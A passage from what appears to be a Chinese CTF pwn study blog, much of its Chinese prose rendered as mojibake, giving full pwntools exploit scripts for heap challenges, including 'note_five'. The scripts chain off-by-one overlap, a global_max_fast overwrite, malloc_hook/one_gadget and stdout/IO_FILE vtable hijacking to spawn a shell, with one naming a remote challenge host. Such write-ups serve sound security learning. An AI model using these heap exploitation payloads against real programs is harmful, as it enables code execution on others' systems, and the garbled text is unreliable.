string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x3c67f8</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"global_max_fast => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>global_max_fast<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>one_gadget_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>one_gadgetlog<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__malloc_hook_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"__libc_realloc_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"one_gadget_addr => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__libc_realloc_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="note-five"><a href="#note-five" class="headerlink" title="note_five"></a>note_five</h2><p>è€ƒå¯Ÿç‚¹ï¼šIO_FILEåˆ©ç”¨<br>è¿™é“é¢˜æˆ‘æ˜¯æ‹¿å¤§å¸ˆå‚…çš„expä¸€æ­¥æ­¥è°ƒè¯•çš„ï¼Œç®—æ˜¯å¼„æ˜ç™½äº†åœ¨æ²¡æœ‰showå‡½æ•°çš„æƒ…å†µä¸‹å¦‚ä½•æ³„éœ²å‡ºlibcåœ°å€<br><a href="https://xz.aliyun.com/t/6468" target="_blank" rel="noopener">è¿™ä½å¤§å¸ˆå‚…</a><br>æˆ‘å¯¹åŸexpåšäº†ç‚¹æ”¹åŠ¨ï¼Œç¬¦åˆä¸ªäººä¹ æƒ¯ä¸€ç‚¹ï¼Œexpå¦‚ä¸‹</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># coding=utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>local <span class="token operator">=</span> <span class="token number">1</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./note_five'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bk</span><span class="token punctuation">(</span>mallocr<span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">"b *"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>mallocr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sl</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sd</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rc</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ru</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ti</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0xe0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x2f0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span>    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x2f0</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    global_max_fast <span class="token operator">=</span> <span class="token number">0x77f8</span>    stdout <span class="token operator">=</span> <span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x1229</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p16<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>    py <span class="token operator">=</span> <span class="token string">''</span>    py <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x41</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> py<span class="token punctuation">)</span>    rc<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c5600</span>    onegadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1147</span>    <span class="token keyword">print</span> <span class="token string">"libc_base--->"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>    fake_vtable <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c5600</span><span class="token operator">-</span><span class="token number">8</span>    binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>    py <span class="token operator">=</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c55e0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">+</span> \        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_vtable<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> py<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># trigger abort-->flush</span>    malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> i    i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        local <span class="token operator">=</span> <span class="token number">1</span>        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note_five'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> local<span class="token punctuation">:</span>            p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./note_five'</span><span class="token punctuation">)</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.40.246.48'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        sl<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ç¨‹åºä¿æŠ¤å…¨å¼€ï¼Œèœå•é¢˜ï¼Œæ‹–è¿›IDAåˆ†æä¸€ä¸‹<br>mainå‡½æ•°<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/10.jpg" alt=""><br>addå‡½æ•°<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/11.jpg" alt=""><br>å…è®¸åˆ†é…çš„chunkå¤§äºfastbin<br>editå‡½æ•°<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/13.jpg" alt=""><br>å…¶ä¸­çš„sub_A70çš„å‡½æ•°å­˜åœ¨off-by-oneæ¼æ´<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/12.jpg" alt=""><br>æœ€åæ˜¯deleteå‡½æ•°<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/14.jpg" alt=""><br>freeå¹¶ä¸”æ¸…é›¶ï¼Œæ— æ¼æ´<br>æˆ‘ä»¬çš„æ”»å‡»æ€è·¯å¦‚ä¸‹</p><blockquote><p>1.åˆ©ç”¨offbyoneå®ç°overlap<br>2.åˆ©ç”¨overlapå®ç°æ”¹BKæŒ‡é’ˆï¼Œæ”»å‡»global_max_fast<br>3.æ”¹FDæŒ‡é’ˆä¸ºstdout-0x51ï¼ŒæˆåŠŸå®ç°åŠ«æŒ<br>4.æ”¹ç»“æ„ä½“ä»è€Œæ³„éœ²çœŸå®åœ°å€<br>5.ç„¶åä¼ªé€ stderrçš„vtableï¼Œç”±äºç¨‹åºæŠ¥é”™ä¼šæ‰§è¡Œvtable+0x18å¤„çš„IO_file_overflowå‡½æ•°ï¼Œæ‰€ä»¥å°†è¿™ä¸ªIO_file_overflowå‡½æ•°æ”¹æˆonegadget<br>6.mallocå¾ˆå¤§çš„å—ï¼Œæœ€åè§¦å‘IO_file_overflowä¸­çš„_IO_flush_all_lockpï¼Œä»è€Œgetshell</p></blockquote><p>é¦–å…ˆé€šè¿‡off-by-oneè§¦å‘åå‘åˆå¹¶</p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0xe0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x2f0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre><p>åˆå§‹çŠ¶æ€<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/15.jpg" alt=""><br>free(0)ä¹‹å<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/16.jpg" alt=""><br>off-by-oneä¹‹å<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/17.jpg" alt=""><br>free(3)ä¹‹åï¼Œå¯¼è‡´åå‘åˆå¹¶<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/18.jpg" alt=""><br>æ¥ä¸‹æ¥å°†å †å—æ„é€ æˆåˆå§‹çŠ¶æ€</p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x2f0</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/19.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/20.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/21.jpg" alt=""><br>ç„¶åfreeæ‰chunk1ï¼Œä½¿main_arenaæ”¾åˆ°chunk1çš„fdå’ŒbkæŒ‡é’ˆä¸Šï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡edit0æ¥ä¿®æ”¹globa_max_fastäº†</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> <span class="token number">0x77f8</span>stdout <span class="token operator">=</span> <span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x1229</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 